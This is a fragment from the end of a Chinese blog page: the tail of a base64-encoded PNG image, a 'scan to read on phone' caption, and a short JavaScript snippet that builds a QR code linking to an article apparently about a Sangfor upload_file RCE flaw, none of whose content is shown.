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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/sangfor\_osm-cssp-app-upload\_file-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 